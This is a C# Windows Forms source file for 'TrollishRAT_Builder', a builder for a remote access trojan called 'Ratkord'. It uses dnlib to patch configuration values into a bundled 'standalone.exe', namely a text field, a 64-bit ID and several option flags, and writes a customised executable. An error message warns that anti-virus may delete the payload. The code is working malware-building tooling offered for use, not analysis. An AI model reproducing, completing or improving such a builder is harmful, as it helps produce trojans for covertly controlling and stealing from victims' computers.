using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;

namespace TrollishRAT_Builder
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();

            textBox1.TextChanged += TxtChanged;
            textBox2.TextChanged += TxtChanged;
            textBox3.TextChanged += TxtChanged;
            textBox4.TextChanged += TxtChanged;
        }


        private void TxtChanged(object s, EventArgs e)
        {
            button1.Enabled = textBox1.Text.Length > 0 && textBox2.Text.Length > 0 && textBox3.Text.Length > 0 && textBox4.Text.Length > 0;
        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (File.Exists("standalone.exe"))
            {
                var Assembly = AssemblyDef.Load("standalone.exe");
                var Module = Assembly.ManifestModule;
                if (Module != null)
                {
                    var Settings = Module.GetTypes().Where(type => type.FullName == "RATK.Settings").FirstOrDefault();
                    if (Settings != null)
                    {
                        var Constructor = Settings.FindMethod(".cctor");
                        if (Constructor != null)
                        {

                            Constructor.Body.Instructions[0].Operand = textBox1.Text; progressBar1.Value += 5;
                            Constructor.Body.Instructions[2].Operand = unchecked((long)ulong.Parse(textBox2.Text)); progressBar1.Value += 5;
                            Constructor.Body.Instructions[8].Operand = unchecked(checkBox4.Checked); progressBar1.Value += 5;
                            Constructor.Body.Instructions[10].Operand = unchecked(checkBox1.Checked); progressBar1.Value += 5;
                            Constructor.Body.Instructions[12].Operand = unchecked(checkBox2.Checked); progressBar1.Value += 5;

                            try
                            {
                                Assembly.Write($"{textBox4.Text}.exe");
                                progressBar1.Value = 100;
                                MessageBox.Show($"Ratkord has been successfully built to: {textBox4.Text}.exe", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            catch (Exception b)
                            {
                                progressBar1.Value = 0;
                                MessageBox.Show($"An error occurred while building:\n{b}", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Could not get the manifest module, try reinstalling the standalone.", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                MessageBox.Show("Ratkord Standalone (standalone.exe) could not be found! Please try reinstalling/check if your anti-virus is not deleting the executable.", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
